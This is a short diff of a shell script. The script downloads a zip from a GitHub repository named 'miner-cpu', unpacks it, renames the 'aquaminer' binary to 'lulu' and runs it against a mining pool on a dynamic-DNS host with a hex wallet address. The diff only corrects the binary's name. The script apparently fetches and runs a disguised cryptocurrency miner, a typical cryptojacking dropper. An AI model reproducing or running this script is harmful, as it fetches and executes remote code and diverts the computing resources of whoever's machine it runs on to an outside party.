@@ -30,6 +30,6 @@ fi
 
 wget https://github.com/StupidmanTan/miner-cpu/raw/master/kaka.zip
 unzip kaka.zip
-mv kaka lulu
+mv aquaminer-0.4-linux-amd64 lulu
 ./lulu -F http://ohmygodguru.ddns.net:56789/0x6f392f86702e358b16074ad635f9b273b44972c1/ggc
 exit 0
